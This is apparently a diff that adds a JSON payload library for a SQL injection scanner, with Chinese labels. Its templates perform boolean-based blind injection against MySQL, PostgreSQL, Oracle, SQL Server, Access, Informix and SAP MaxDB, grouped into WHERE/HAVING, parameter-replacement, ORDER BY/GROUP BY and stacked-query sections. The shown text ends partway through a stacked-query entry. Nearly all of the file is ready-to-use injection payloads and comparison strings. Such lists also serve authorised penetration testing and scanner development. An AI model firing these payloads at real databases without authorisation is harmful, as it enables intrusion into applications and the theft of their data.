@@ -1,0 +1,853 @@
+{
+  "1": {
+    "desc": "where / having 子句布尔盲注测试",
+    "payload": [
+      {
+        "type": " AND 布尔盲注 - where 或 having 子句",
+        "where": 1,
+        "clause": [
+          1,
+          8,
+          9
+        ],
+        "payload": "AND [RANDNUM]=[RANDNUM]",
+        "compare": "AND [RANDNUM]=[RANDNUM1]"
+      },
+      {
+        "type": " OR 布尔盲注 - where 或 having 子句",
+        "where": 2,
+        "clause": [
+          1,
+          9
+        ],
+        "payload": "OR [RANDNUM]=[RANDNUM]",
+        "compare": "OR [RANDNUM]=[RANDNUM1]"
+      },
+      {
+        "type": " OR NOT 布尔盲注 - where 或 having 子句",
+        "where": 1,
+        "clause": [
+          1,
+          9
+        ],
+        "payload": "OR NOT [RANDNUM]=[RANDNUM]",
+        "compare": "OR NOT [RANDNUM]=[RANDNUM1]"
+      },
+      {
+        "type": " AND 布尔盲注 - where 或 having 子句（子查询 - 注释）",
+        "where": 1,
+        "clause": [
+          1,
+          8,
+          9
+        ],
+        "payload": "AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))",
+        "compare": "AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))",
+        "comment": "[GENERIC_SQL_COMMENT]"
+      },
+      {
+        "type": " OR 布尔盲注 - where 或 having 子句（子查询 - 注释）",
+        "where": 2,
+        "clause": [
+          1,
+          9
+        ],
+        "payload": "OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))",
+        "compare": "OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))",
+        "comment": "[GENERIC_SQL_COMMENT]"
+      },
+      {
+        "type": " AND 布尔盲注 - where 或 having 子句（注释）",
+        "where": 1,
+        "clause": [
+          1
+        ],
+        "payload": "AND [RANDNUM]=[RANDNUM]",
+        "compare": "AND [RANDNUM]=[RANDNUM1]",
+        "comment": "[GENERIC_SQL_COMMENT]"
+      },
+      {
+        "type": " OR 布尔盲注 - where 或 having 子句（注释）",
+        "where": 2,
+        "clause": [
+          1
+        ],
+        "payload": "OR [RANDNUM]=[RANDNUM]",
+        "compare": "OR [RANDNUM]=[RANDNUM1]",
+        "comment": "[GENERIC_SQL_COMMENT]"
+      },
+      {
+        "type": " OR NOT 布尔盲注 - where 或 having 子句（注释）",
+        "where": 1,
+        "clause": [
+          1
+        ],
+        "payload": "OR NOT [RANDNUM]=[RANDNUM]",
+        "compare": "OR NOT [RANDNUM]=[RANDNUM1]",
+        "comment": "[GENERIC_SQL_COMMENT]"
+      },
+      {
+        "type": " AND 布尔盲注 - where 或 having 子句（MYSQL注释）",
+        "where": 1,
+        "clause": [
+          1
+        ],
+        "payload": "AND [RANDNUM]=[RANDNUM]",
+        "compare": "AND [RANDNUM]=[RANDNUM1]",
+        "comment": "#",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " OR 布尔盲注 - where 或 having 子句（MYSQL注释）",
+        "where": 2,
+        "clause": [
+          1
+        ],
+        "payload": "OR [RANDNUM]=[RANDNUM]",
+        "compare": "OR [RANDNUM]=[RANDNUM1]",
+        "comment": "#",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " OR NOT 布尔盲注 - where 或 having 子句（MYSQL注释）",
+        "where": 1,
+        "clause": [
+          1
+        ],
+        "payload": "OR NOT [RANDNUM]=[RANDNUM]",
+        "compare": "OR NOT [RANDNUM]=[RANDNUM1]",
+        "comment": "#",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " AND 布尔盲注 - where 或 having 子句（Microsoft Access注释）",
+        "where": 1,
+        "clause": [
+          1
+        ],
+        "payload": "AND [RANDNUM]=[RANDNUM]",
+        "compare": "AND [RANDNUM]=[RANDNUM1]",
+        "comment": "%16",
+        "dbms": "Microsoft Access"
+      },
+      {
+        "type": " OR 布尔盲注 - where 或 having 子句（Microsoft Access注释）",
+        "where": 2,
+        "clause": [
+          1
+        ],
+        "payload": "OR [RANDNUM]=[RANDNUM]",
+        "compare": "OR [RANDNUM]=[RANDNUM1]",
+        "comment": "%16",
+        "dbms": "Microsoft Access"
+      },
+      {
+        "type": " MYSQL RLIKE 布尔盲注 - where/having/order by/group by 子句",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))",
+        "compare": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL AND 布尔盲注 - where/having/order by/group by 子句（MAKE_SET）",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          8
+        ],
+        "payload": "AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])",
+        "compare": "AND MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL OR 布尔盲注 - where/having/order by/group by 子句（MAKE_SET）",
+        "where": 2,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])",
+        "compare": "OR MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL AND 布尔盲注 - where/having/order by/group by 子句（ELT）",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          8
+        ],
+        "payload": "AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])",
+        "compare": "AND ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL OR 布尔盲注 - where/having/order by/group by 子句（ELT）",
+        "where": 2,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])",
+        "compare": "OR ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL AND 布尔盲注 - where/having/order by/group by 子句（布尔 * 数值）",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          8
+        ],
+        "payload": "AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]",
+        "compare": "AND ([RANDNUM]=[RANDNUM1])*[RANDNUM1]",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL OR 布尔盲注 - where/having/order by/group by 子句（布尔 * 数值）",
+        "where": 2,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]",
+        "compare": "OR ([RANDNUM]=[RANDNUM1])*[RANDNUM1]",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " PostgreSQL AND 布尔盲注 - where 或 having 子句（CAST）",
+        "where": 1,
+        "clause": [
+          1,
+          8
+        ],
+        "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
+        "compare": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " PostgreSQL OR 布尔盲注 - where 或 having 子句（CAST）",
+        "where": 2,
+        "clause": [
+          1
+        ],
+        "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
+        "compare": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " Oracle AND 布尔盲注 - where 或 having 子句（CTXSYS.DRITHSX.SN）",
+        "where": 1,
+        "clause": [
+          1
+        ],
+        "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",
+        "compare": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",
+        "dbms": "Oracle"
+      },
+      {
+        "type": " Oracle OR 布尔盲注 - where 或 having 子句（CTXSYS.DRITHSX.SN）",
+        "where": 2,
+        "clause": [
+          1
+        ],
+        "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",
+        "compare": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",
+        "dbms": "Oracle"
+      }
+    ]
+  },
+  "2": {
+    "desc": "参数替换布尔盲注测试",
+    "payload": [
+      {
+        "type": " 布尔盲注 - 参数替换（原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))"
+      },
+      {
+        "type": " MYSQL 布尔盲注 - 参数替换（MAKE_SET）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])",
+        "compare": "MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL 布尔盲注 - 参数替换（MAKE_SET - 原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])",
+        "compare": "MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL 布尔盲注 - 参数替换（ELT）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "ELT([RANDNUM]=[RANDNUM],[RANDNUM1])",
+        "compare": "ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL 布尔盲注 - 参数替换（ELT - 原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])",
+        "compare": "ELT([RANDNUM]=[RANDNUM1],[ORIGVALUE])",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL 布尔盲注 - 参数替换（布尔 * 数值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "([RANDNUM]=[RANDNUM])*[RANDNUM1]",
+        "compare": "([RANDNUM]=[RANDNUM1])*[RANDNUM1]",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " MYSQL 布尔盲注 - 参数替换（布尔 * 数值 - 原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "([RANDNUM]=[RANDNUM])*[ORIGVALUE]",
+        "compare": "([RANDNUM]=[RANDNUM1])*[ORIGVALUE]",
+        "dbms": "MySQL"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - 参数替换",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - 参数替换（原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - 参数替换（生成序列）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)",
+        "compare": "(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - 参数替换（生成序列 - 原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)",
+        "compare": "(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " Microsoft SQL Server/Sybase 布尔盲注 - 参数替换",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "dbms": "Microsoft SQL Server/Sybase",
+        "os": "Windows"
+      },
+      {
+        "type": " Microsoft SQL Server/Sybase 布尔盲注 - 参数替换（原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "dbms": "Microsoft SQL Server/Sybase",
+        "os": "Windows"
+      },
+      {
+        "type": " Oracle 布尔盲注 - 参数替换",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "dbms": "Oracle"
+      },
+      {
+        "type": " Oracle 布尔盲注 - 参数替换（原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "dbms": "Oracle"
+      },
+      {
+        "type": " Informix 布尔盲注 - 参数替换",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)",
+        "dbms": "Informix"
+      },
+      {
+        "type": " Informix 布尔盲注 - 参数替换（原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)",
+        "compare": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)",
+        "dbms": "Informix"
+      },
+      {
+        "type": " Microsoft Access 布尔盲注 - 参数替换",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)",
+        "compare": "IIF([RANDNUM]=[RANDNUM1],[RANDNUM],1/0)",
+        "dbms": "Microsoft Access"
+      },
+      {
+        "type": " Microsoft Access 布尔盲注 - 参数替换（原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)",
+        "compare": "IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)",
+        "dbms": "Microsoft Access"
+      },
+      {
+        "type": "布尔盲注 - 参数替换（多种数据库）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)",
+        "compare": "(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)"
+      },
+      {
+        "type": "布尔盲注 - 参数替换（多种数据库 - 原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          2,
+          3
+        ],
+        "payload": "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)",
+        "compare": "(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)"
+      },
+      {
+        "type": "布尔盲注 - 参数替换（CASE）",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)",
+        "compare": "(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)"
+      },
+      {
+        "type": "布尔盲注 - 参数替换（CASE - 原始值）",
+        "where": 3,
+        "clause": [
+          1,
+          3
+        ],
+        "payload": "(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)",
+        "compare": "(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)"
+      }
+    ]
+  },
+  "3": {
+    "desc": "order by / group by 子句布尔盲注测试",
+    "payload": [
+      {
+        "type": " MySQL >= 5.0 布尔盲注 - order by 或 group by 子句",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "dbms": "MySQL >= 5.0"
+      },
+      {
+        "type": " MySQL >= 5.0 布尔盲注 - order by 或 group by 子句（原始值）",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "dbms": "MySQL >= 5.0"
+      },
+      {
+        "type": " MySQL <= 5.0 布尔盲注 - order by 或 group by 子句",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "dbms": "MySQL < 5.0"
+      },
+      {
+        "type": " MySQL <= 5.0 布尔盲注 - order by 或 group by 子句（原始值）",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))",
+        "dbms": "MySQL < 5.0"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - order by 或 group by 子句",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - order by 子句（原始值）",
+        "where": 1,
+        "clause": [
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - order by 子句（生成序列）",
+        "where": 1,
+        "clause": [
+          3
+        ],
+        "payload": ",(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)",
+        "compare": ",(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)",
+        "dbms": "PostgreSQL"
+      },
+      {
+        "type": " Microsoft SQL Server/Sybase 布尔盲注 - order by 子句",
+        "where": 1,
+        "clause": [
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "dbms": "Microsoft SQL Server/Sybase",
+        "os": "Windows"
+      },
+      {
+        "type": " Microsoft SQL Server/Sybase 布尔盲注 - order by 子句（原始值）",
+        "where": 1,
+        "clause": [
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",
+        "dbms": "Microsoft SQL Server/Sybase",
+        "os": "Windows"
+      },
+      {
+        "type": " Oracle 布尔盲注 - order by 或 group by 子句",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "dbms": "Oracle"
+      },
+      {
+        "type": " Oracle 布尔盲注 - order by 或 group by 子句（原始值）",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "compare": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+        "dbms": "Oracle"
+      },
+      {
+        "type": " Microsoft Access 布尔盲注 - order by 或 group by 子句",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",IIF([RANDNUM]=[RANDNUM],1,1/0)",
+        "compare": ",IIF([RANDNUM]=[RANDNUM1],1,1/0)",
+        "dbms": "Microsoft Access"
+      },
+      {
+        "type": " Microsoft Access 布尔盲注 - order by 或 group by 子句（原始值）",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)",
+        "compare": ",IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)",
+        "dbms": "Microsoft Access"
+      },
+      {
+        "type": " SAP MaxDB 布尔盲注 - order by 或 group by 子句",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)",
+        "compare": ",(CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END)",
+        "dbms": "SAP MaxDB"
+      },
+      {
+        "type": " SAP MaxDB 布尔盲注 - order by 或 group by 子句（原始值）",
+        "where": 1,
+        "clause": [
+          2,
+          3
+        ],
+        "payload": ",(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)",
+        "compare": ",(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)",
+        "dbms": "SAP MaxDB"
+      },
+      {
+        "type": " HAVING 布尔盲注 - where 或 group by 子句",
+        "where": 1,
+        "clause": [
+          1,
+          2
+        ],
+        "payload": "HAVING [RANDNUM]=[RANDNUM]",
+        "compare": "HAVING [RANDNUM]=[RANDNUM1]"
+      }
+    ]
+  },
+  "4": {
+    "desc": "堆叠查询布尔盲注测试",
+    "payload": [
+      {
+        "type": " MySQL 布尔盲注 - 堆叠查询",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          4,
+          5,
+          6,
+          7,
+          8
+        ],
+        "payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)",
+        "compare": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)",
+        "dbms": "MySQL",
+        "comment": "#"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - 堆叠查询",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          4,
+          5,
+          6,
+          7,
+          8
+        ],
+        "payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)",
+        "compare": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)",
+        "dbms": "PostgreSQL",
+        "comment": "--"
+      },
+      {
+        "type": " PostgreSQL 布尔盲注 - 堆叠查询（生成序列）",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          4,
+          5,
+          6,
+          7,
+          8
+        ],
+        "payload": ";SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1",
